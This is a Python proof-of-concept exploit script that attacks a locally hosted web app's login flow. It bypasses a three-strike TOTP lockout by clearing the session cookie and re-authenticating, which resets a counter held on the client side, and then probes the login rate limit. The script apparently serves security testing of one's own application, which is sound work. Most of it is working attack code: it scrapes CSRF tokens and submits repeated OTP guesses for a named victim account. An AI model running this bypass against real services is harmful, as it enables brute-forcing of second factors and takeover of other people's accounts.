"""
POC 4: Rate Limiting & TOTP 3-Strike Lockout Reset Bypass
Target: http://127.0.0.1:5000

Vulnerabilities:
1. In-Memory Single-Process State: The limiter state is stored in memory://.
2. Client-Side OTP Strike Counter: The 3-attempt OTP limit is tracked purely in the signed
   client cookie session['otp_attempts']. If an attacker suppresses the Set-Cookie response
   or clears their cookie jar and re-authenticates stage 1, the strike counter resets to zero,
   completely defeating the 3-strike account lockout!
3. Rate Limiting Throttling: Enforces 5 per minute per IP on /loginsubmit.
"""

import http.cookiejar
import re
import urllib.parse
import urllib.request

BASE_URL = "http://127.0.0.1:5000"

def run_poc():
    print("[*] Testing TOTP 3-Strike Lockout Reset and Rate Limiter...")

    # -------------------------------------------------------------------------
    # Part 1: TOTP 3-Strike Lockout Reset Bypass
    # -------------------------------------------------------------------------
    print("\n--- Part 1: Testing TOTP 3-Strike Lockout Session-Cookie Reset ---")
    cj = http.cookiejar.CookieJar(policy=http.cookiejar.DefaultCookiePolicy(secure_protocols=("https", "http")))
    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def http_error_302(self, req, fp, code, msg, headers):
            return fp

    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), NoRedirect())
    
    # Authenticate Stage 1 as victim_alice
    login_page = opener.open(f"{BASE_URL}/login").read().decode("utf-8")
    csrf_tok = re.search(r'name="csrf_token"\s+value="([^"]+)"', login_page).group(1)
    login_data = urllib.parse.urlencode({
        "csrf_token": csrf_tok, "username": "victim_alice", "password": "PwnedPassword2026!"
    }).encode("utf-8")
    opener.open(urllib.request.Request(
        f"{BASE_URL}/loginsubmit", data=login_data,
        headers={"Content-Type": "application/x-www-form-urlencoded"}, method="POST"
    ))

    # Send Attempt 1 (Invalid OTP)
    otp_p1 = opener.open(f"{BASE_URL}/verify-otp").read().decode("utf-8")
    csrf_o1 = re.search(r'name="csrf_token"\s+value="([^"]+)"', otp_p1).group(1)
    res_o1 = opener.open(urllib.request.Request(
        f"{BASE_URL}/verify-otp",
        data=urllib.parse.urlencode({"csrf_token": csrf_o1, "otp": "000000"}).encode("utf-8"),
        headers={"Content-Type": "application/x-www-form-urlencoded"}, method="POST"
    )).read().decode("utf-8")
    m1 = re.search(r'You have (\d+ attempts? remaining)', res_o1)
    print(f"    [Strike 1] Response: {m1.group(0) if m1 else 'None'}")

    # Send Attempt 2 (Invalid OTP)
    csrf_o2 = re.search(r'name="csrf_token"\s+value="([^"]+)"', res_o1).group(1)
    res_o2 = opener.open(urllib.request.Request(
        f"{BASE_URL}/verify-otp",
        data=urllib.parse.urlencode({"csrf_token": csrf_o2, "otp": "000000"}).encode("utf-8"),
        headers={"Content-Type": "application/x-www-form-urlencoded"}, method="POST"
    )).read().decode("utf-8")
    m2 = re.search(r'You have (\d+ attempts? remaining)', res_o2)
    print(f"    [Strike 2] Response: {m2.group(0) if m2 else 'None'}")

    # BYPASS DEMONSTRATION:
    # Clear client cookie jar (simulating attacker dropping updated session cookie)
    print("    [!] Attacker resets session cookie and re-authenticates stage 1...")
    cj.clear()
    login_p2 = opener.open(f"{BASE_URL}/login").read().decode("utf-8")
    csrf_tok2 = re.search(r'name="csrf_token"\s+value="([^"]+)"', login_p2).group(1)
    opener.open(urllib.request.Request(
        f"{BASE_URL}/loginsubmit",
        data=urllib.parse.urlencode({"csrf_token": csrf_tok2, "username": "victim_alice", "password": "PwnedPassword2026!"}).encode("utf-8"),
        headers={"Content-Type": "application/x-www-form-urlencoded"}, method="POST"
    ))

    # Send Attempt 3 after cookie reset
    otp_p3 = opener.open(f"{BASE_URL}/verify-otp").read().decode("utf-8")
    csrf_o3 = re.search(r'name="csrf_token"\s+value="([^"]+)"', otp_p3).group(1)
    res_o3 = opener.open(urllib.request.Request(
        f"{BASE_URL}/verify-otp",
        data=urllib.parse.urlencode({"csrf_token": csrf_o3, "otp": "000000"}).encode("utf-8"),
        headers={"Content-Type": "application/x-www-form-urlencoded"}, method="POST"
    )).read().decode("utf-8")
    m3 = re.search(r'You have (\d+ attempts? remaining)', res_o3)
    print(f"    [Attempt 3 after cookie reset] Response: {m3.group(0) if m3 else 'None'}")
    if m3 and "2 attempts remaining" in m3.group(0):
        print("[!] LOCKOUT BYPASS CONFIRMED: Counter reset back to 2 attempts because state is held client-side in cookies!")
    else:
        print("[-] Lockout bypass failed: Database maintained strike count across cookie reset (exploit failed).")

    # -------------------------------------------------------------------------
    # Part 2: Rate Limiting Enforcement Test on /loginsubmit
    # -------------------------------------------------------------------------
    print("\n--- Part 2: Testing /loginsubmit 5/min IP Throttling ---")
    for i in range(1, 8):
        page = opener.open(f"{BASE_URL}/login").read().decode("utf-8")
        csrf = re.search(r'name="csrf_token"\s+value="([^"]+)"', page).group(1)
        data = urllib.parse.urlencode({
            "csrf_token": csrf, "username": f"test_throttle_{i}", "password": "Password123!"
        }).encode("utf-8")
        req = urllib.request.Request(
            f"{BASE_URL}/loginsubmit", data=data,
            headers={"Content-Type": "application/x-www-form-urlencoded"}, method="POST"
        )
        try:
            resp = opener.open(req)
            print(f"    Request {i}: Status {resp.status} (Allowed)")
        except urllib.error.HTTPError as e:
            print(f"    Request {i}: Status {e.code} (Rate Limited)")

if __name__ == "__main__":
    run_poc()
